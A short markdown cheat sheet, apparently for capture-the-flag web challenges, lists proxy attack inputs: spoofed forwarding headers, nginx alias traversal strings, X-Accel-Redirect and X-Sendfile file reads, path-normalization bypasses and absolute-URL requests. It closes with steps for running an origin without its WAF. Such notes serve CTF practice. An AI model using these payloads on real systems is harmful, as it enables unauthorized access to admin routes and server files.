# Proxy

## Headers

```http
Host: internal
X-Forwarded-Host: internal
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Proto: https
```

## Nginx Alias Traversal

When config has `location /static/ { alias /app/static/; }`:

```text
/static../flag.txt
/static/../flag.txt
/static../app.py
/static%2e%2e/flag.txt
```

## X-Accel / X-Sendfile

If user-controlled headers or upstream response can set these:

```http
X-Accel-Redirect: /internal/flag
X-Accel-Redirect: /protected/../../flag.txt
X-Sendfile: /flag.txt
```

## Frontend / Backend Mismatch

```text
/api/../admin
/api/%2e%2e/admin
/api;/admin
//admin
/%2fadmin
```

## Local Only Bypass

```http
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 127.0.0.1, 8.8.8.8
X-Real-IP: 127.0.0.1
Forwarded: for=127.0.0.1;host=localhost;proto=https
```

## Disable WAF Locally

Use when the challenge has an origin service behind a WAF/proxy. First prove the vulnerability on the origin, then re-enable the WAF and solve only the bypass.

```bash
# Docker compose: start only the origin.
docker compose up -d app
docker compose port app 3000

# Run one app container with a published port, without the WAF service.
docker compose run --rm -p 3000:3000 app

# If the origin only has expose:, temporarily publish it locally:
# app:
#   ports:
#     - "3000:3000"

# Node/Next style origin:
npm install
FLAG='CBC{FAKEFLAG}' npm run build
FLAG='CBC{FAKEFLAG}' npm start
```

PowerShell:

```powershell
npm install
$env:FLAG='CBC{FAKEFLAG}'; npm run build
$env:FLAG='CBC{FAKEFLAG}'; npm start
```

Compare:

```text
origin URL: http://127.0.0.1:3000/
WAF URL:    http://127.0.0.1:8080/
```

Keep the same exploit code and make only the URL configurable. If it works on origin but fails on WAF, the remaining problem is parser or normalization mismatch.

## Absolute URL

```http
GET http://internal/admin HTTP/1.1
Host: public
```
